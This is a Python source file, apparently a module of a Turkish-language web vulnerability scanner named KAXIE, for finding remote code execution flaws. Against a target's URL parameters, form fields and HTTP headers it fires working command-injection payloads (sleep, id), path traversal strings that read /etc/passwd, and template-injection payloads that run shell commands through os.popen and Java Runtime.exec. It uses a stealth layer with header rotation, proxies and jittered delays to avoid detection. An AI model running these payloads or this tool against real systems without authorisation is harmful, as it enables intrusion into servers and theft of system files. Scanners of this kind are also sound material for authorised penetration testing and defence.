"""
KAXIE Scanner - RCE (Remote Code Execution) Tarama Modülü
"""

import requests
import re
import time
from urllib.parse import urljoin, urlparse, quote
from config import SCAN_CONFIG, Colors
from utils.stealth import StealthManager
from utils.payload_gen import PayloadGenerator


class RCEScanner:
    """RCE zafiyetlerini tespit eden sınıf."""

    def __init__(self, target, reporter, ai_engine=None, forms=None, links=None):
        self.target = target
        self.reporter = reporter
        self.ai_engine = ai_engine
        self.forms = forms or []
        self.links = links or []
        self.stealth = StealthManager()
        self.payload_gen = PayloadGenerator()
        self.session = requests.Session()
        self.session.verify = SCAN_CONFIG["verify_ssl"]
        self.vulnerable_params = []

    def run(self):
        """Tüm RCE testlerini çalıştırır."""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}  [*] RCE ZAFİYET TARAMASI BAŞLADI{Colors.RESET}")
        print(f"{Colors.CYAN}  [*] Hedef: {self.target}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")

        self._test_url_params()
        self._test_forms()
        self._test_headers()
        self._test_path_traversal()
        self._test_template_injection()

        if self.ai_engine and self.ai_engine.selected_model and self.vulnerable_params:
            print(f"\n{Colors.MAGENTA}  [*] AI RCE analizi yapılıyor...{Colors.RESET}")
            for vp in self.vulnerable_params:
                analysis = self.ai_engine.analyze_vulnerability(
                    vuln_type="RCE",
                    target=vp["url"],
                    evidence=vp["evidence"],
                    response_snippet=vp.get("response", ""),
                )
                if analysis:
                    self.reporter.add_ai_analysis("RCE", analysis)
                    vp["ai_analysis"] = analysis

        return self.vulnerable_params

    def _make_request(self, url, method="GET", data=None, headers=None):
        """İstek yapar."""
        if headers is None:
            headers = self.stealth.get_headers(self.target)

        self.stealth.jitter_delay()

        try:
            if method.upper() == "GET":
                resp = self.session.get(
                    url, headers=headers, timeout=SCAN_CONFIG["timeout"],
                    verify=False, allow_redirects=True, proxies=self.stealth.get_proxy(),
                )
            else:
                resp = self.session.post(
                    url, data=data, headers=headers, timeout=SCAN_CONFIG["timeout"],
                    verify=False, allow_redirects=True, proxies=self.stealth.get_proxy(),
                )
            self.reporter.scan_stats["total_requests"] += 1
            return resp
        except Exception:
            return None

    def _check_rce_indicators(self, response_text, payload_type="linux"):
        """RCE kanıtlarını arar."""
        indicators = {
            "linux": [
                r"uid=\d+\([^)]+\)",
                r"gid=\d+\([^)]+\)",
                r"groups=\d+",
                r"root:",
                r"/bin/(?:ba)?sh",
                r"Linux\s+\S+",
                r"total\s+\d+\s+drwx",
                r"drwx[rxw-]{9}",
                r"-rw[rxw-]{9}",
                r"nobody:",
                r"daemon:",
                r"www-data:",
            ],
            "windows": [
                r"Volume Serial Number",
                r"Directory of\s+[A-Z]:",
                r"[A-Z]:\\",
                r"\\Windows\\",
                r"\\System32\\",
                r"NT AUTHORITY",
            ],
            "generic": [
                r"Command completed",
                r"sh:",
                r"bash:",
                r"cmd\.exe",
                r"powershell",
                r"eval\(",
                r"exec\(",
                r"system\(",
                r"passthru\(",
                r"popen\(",
                r"proc_open\(",
                r"shell_exec\(",
            ],
        }

        found = []
        for category, patterns in indicators.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    found.append((category, pattern))

        return found

    def _test_url_params(self):
        """URL parametrelerinde RCE test eder."""
        print(f"\n  {Colors.BLUE}[*] URL parametrelerinde RCE testi...{Colors.RESET}")

        test_urls = [self.target]
        for link in self.links[:20]:
            parsed = urlparse(link)
            if parsed.query:
                test_urls.append(link)

        time_based_payloads = [
            ("; sleep 5", 5),
            ("| sleep 5", 5),
            ("& sleep 5", 5),
            ("`sleep 5`", 5),
            ("$(sleep 5)", 5),
            ("; ping -c 5 127.0.0.1", 5),
            ("| ping -n 5 127.0.0.1", 5),
            ("& timeout 5", 5),
        ]

        command_payloads = self.payload_gen.get_payloads("RCE")

        for url in test_urls:
            parsed = urlparse(url)
            if not parsed.query:
                continue

            from urllib.parse import parse_qs, urlencode
            params = parse_qs(parsed.query)

            for param_name in params:
                for payload in command_payloads[:10]:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                    resp = self._make_request(test_url)
                    if resp:
                        indicators = self._check_rce_indicators(resp.text)
                        if indicators:
                            evidence = f"Param: {param_name}, Payload: {payload}, Indicators: {indicators}"
                            self.reporter.add_finding(
                                vuln_type="RCE",
                                severity="CRITICAL",
                                title=f"RCE zafiyeti tespit edildi (URL param: {param_name})",
                                description="URL parametresi üzerinden komut enjeksiyonu mümkün.",
                                evidence=evidence,
                                url=test_url,
                            )
                            self.vulnerable_params.append({
                                "url": test_url,
                                "param": param_name,
                                "payload": payload,
                                "evidence": evidence,
                                "response": resp.text[:500],
                            })
                            break

            for param_name in params:
                for payload, expected_delay in time_based_payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                    start = time.time()
                    resp = self._make_request(test_url)
                    elapsed = time.time() - start

                    if elapsed >= expected_delay - 1:
                        evidence = f"Time-based RCE: Param={param_name}, Payload={payload}, Delay={elapsed:.1f}s"
                        self.reporter.add_finding(
                            vuln_type="RCE",
                            severity="CRITICAL",
                            title=f"Time-based RCE tespit edildi (URL param: {param_name})",
                            description="Zaman tabanlı komut enjeksiyonu doğrulandı.",
                            evidence=evidence,
                            url=test_url,
                        )
                        self.vulnerable_params.append({
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "evidence": evidence,
                            "response": "",
                        })
                        break

    def _test_forms(self):
        """Form girişlerinde RCE test eder."""
        print(f"\n  {Colors.BLUE}[*] Form girişlerinde RCE testi...{Colors.RESET}")

        for form in self.forms:
            action = form.get("action", self.target)
            method = form.get("method", "GET")
            inputs = form.get("inputs", [])

            text_inputs = [i for i in inputs if i.get("type", "text").lower() in ["text", "search", "hidden", "textarea", ""]]

            for inp in text_inputs[:3]:
                param_name = inp.get("name", "")
                if not param_name:
                    continue

                for payload in self.payload_gen.get_payloads("RCE")[:8]:
                    data = {i.get("name", f"field_{j}"): "test" for j, i in enumerate(inputs) if i.get("name")}
                    data[param_name] = payload

                    resp = self._make_request(action, method=method, data=data)
                    if resp:
                        indicators = self._check_rce_indicators(resp.text)
                        if indicators:
                            evidence = f"Form: {action}, Field: {param_name}, Payload: {payload}, Indicators: {indicators}"
                            self.reporter.add_finding(
                                vuln_type="RCE",
                                severity="CRITICAL",
                                title=f"RCE zafiyeti tespit edildi (Form: {param_name})",
                                description="Form alanı üzerinden komut enjeksiyonu mümkün.",
                                evidence=evidence,
                                url=action,
                            )
                            self.vulnerable_params.append({
                                "url": action,
                                "param": param_name,
                                "payload": payload,
                                "evidence": evidence,
                                "response": resp.text[:500],
                            })
                            break

    def _test_headers(self):
        """HTTP başlıklarında RCE test eder."""
        print(f"\n  {Colors.BLUE}[*] HTTP başlıklarında RCE testi...{Colors.RESET}")

        header_payloads = {
            "X-Forwarded-For": ["; id", "`id`", "$(id)", "127.0.0.1; id"],
            "X-Real-IP": ["; id", "`id`", "$(id)"],
            "Referer": ["; id", "`id`"],
            "User-Agent": ["; id", "`id`", "$(id)", "{{7*7}}"],
            "Cookie": ["; id", "`id`"],
            "Accept-Language": ["; id", "`id`"],
            "X-Custom-Header": ["; id", "`id`", "$(id)"],
        }

        for header_name, payloads in header_payloads.items():
            for payload in payloads:
                headers = self.stealth.get_headers(self.target)
                headers[header_name] = payload

                try:
                    resp = self.session.get(
                        self.target,
                        headers=headers,
                        timeout=SCAN_CONFIG["timeout"],
                        verify=False,
                        allow_redirects=True,
                    )
                    self.reporter.scan_stats["total_requests"] += 1

                    if resp:
                        indicators = self._check_rce_indicators(resp.text)
                        if indicators:
                            evidence = f"Header: {header_name}, Payload: {payload}, Indicators: {indicators}"
                            self.reporter.add_finding(
                                vuln_type="RCE",
                                severity="CRITICAL",
                                title=f"Header-based RCE tespit edildi ({header_name})",
                                description="HTTP başlığı üzerinden komut enjeksiyonu mümkün.",
                                evidence=evidence,
                                url=self.target,
                            )
                            self.vulnerable_params.append({
                                "url": self.target,
                                "param": header_name,
                                "payload": payload,
                                "evidence": evidence,
                                "response": resp.text[:500],
                            })
                            break

                except Exception:
                    pass

                self.stealth.jitter_delay()

    def _test_path_traversal(self):
        """Path traversal ve dosya okuma testi."""
        print(f"\n  {Colors.BLUE}[*] Path traversal testi...{Colors.RESET}")

        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "/etc/passwd",
            "/etc/passwd%00",
            "/etc/passwd%00.jpg",
        ]

        traversal_indicators = [
            r"root:x:0:0:",
            r"nobody:",
            r"daemon:",
            r"bin:",
            r"www-data:",
            r"\[boot loader\]",
            r"\[operating systems\]",
            r"multi(0)disk(0)",
        ]

        test_paths = [self.target]
        for link in self.links[:10]:
            parsed = urlparse(link)
            if parsed.path and "." not in parsed.path.split("/")[-1]:
                test_paths.append(link)

        for url in test_paths:
            parsed = urlparse(url)
            base_path = parsed.path or "/"

            for payload in traversal_payloads:
                test_url = f"{parsed.scheme}://{parsed.netloc}{base_path}{payload}"
                resp = self._make_request(test_url)

                if resp:
                    for indicator in traversal_indicators:
                        if re.search(indicator, resp.text, re.IGNORECASE):
                            evidence = f"Payload: {payload}, Indicator: {indicator}"
                            self.reporter.add_finding(
                                vuln_type="RCE",
                                severity="CRITICAL",
                                title="Path traversal zafiyeti tespit edildi",
                                description="Dosya sistemi erişimi mümkün. /etc/passwd veya benzeri dosyalar okunabiliyor.",
                                evidence=evidence,
                                url=test_url,
                            )
                            self.vulnerable_params.append({
                                "url": test_url,
                                "param": "path",
                                "payload": payload,
                                "evidence": evidence,
                                "response": resp.text[:500],
                            })
                            break

    def _test_template_injection(self):
        """Server-Side Template Injection (SSTI) testi."""
        print(f"\n  {Colors.BLUE}[*] Template injection testi...{Colors.RESET}")

        ssti_payloads = [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{7*'7'}}",
            "<%= 7*7 %>",
            "{{config}}",
            "{{self.__class__.__mro__}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{request.application.__globals__}}",
            "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{lipsum.__globals__['os'].popen('id').read()}}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        ]

        ssti_indicators = [
            "49",
            "7777777",
            "Config(",
            "__mro__",
            "subclasses",
            "Runtime",
            "uid=",
            "root:",
        ]

        parsed = urlparse(self.target)
        if parsed.query:
            from urllib.parse import parse_qs, urlencode
            params = parse_qs(parsed.query)

            for param_name in params:
                for payload in ssti_payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                    resp = self._make_request(test_url)
                    if resp:
                        for indicator in ssti_indicators:
                            if indicator in resp.text and indicator not in payload:
                                evidence = f"Param: {param_name}, Payload: {payload}, Indicator: {indicator}"
                                self.reporter.add_finding(
                                    vuln_type="RCE",
                                    severity="CRITICAL",
                                    title=f"SSTI zafiyeti tespit edildi (param: {param_name})",
                                    description="Server-Side Template Injection zafiyeti. Uzaktan kod çalıştırma mümkün.",
                                    evidence=evidence,
                                    url=test_url,
                                )
                                self.vulnerable_params.append({
                                    "url": test_url,
                                    "param": param_name,
                                    "payload": payload,
                                    "evidence": evidence,
                                    "response": resp.text[:500],
                                })
                                break

        for form in self.forms[:5]:
            action = form.get("action", self.target)
            method = form.get("method", "GET")
            inputs = form.get("inputs", [])

            for inp in inputs:
                param_name = inp.get("name", "")
                if not param_name or inp.get("type", "").lower() in ["submit", "button", "checkbox", "radio"]:
                    continue

                for payload in ssti_payloads[:5]:
                    data = {i.get("name", f"f_{j}"): "test" for j, i in enumerate(inputs) if i.get("name")}
                    data[param_name] = payload

                    resp = self._make_request(action, method=method, data=data)
                    if resp:
                        for indicator in ssti_indicators:
                            if indicator in resp.text and indicator not in payload:
                                evidence = f"Form: {action}, Field: {param_name}, Payload: {payload}, Indicator: {indicator}"
                                self.reporter.add_finding(
                                    vuln_type="RCE",
                                    severity="CRITICAL",
                                    title=f"SSTI zafiyeti tespit edildi (form: {param_name})",
                                    description="Server-Side Template Injection zafiyeti.",
                                    evidence=evidence,
                                    url=action,
                                )
                                self.vulnerable_params.append({
                                    "url": action,
                                    "param": param_name,
                                    "payload": payload,
                                    "evidence": evidence,
                                    "response": resp.text[:500],
                                })
                                break
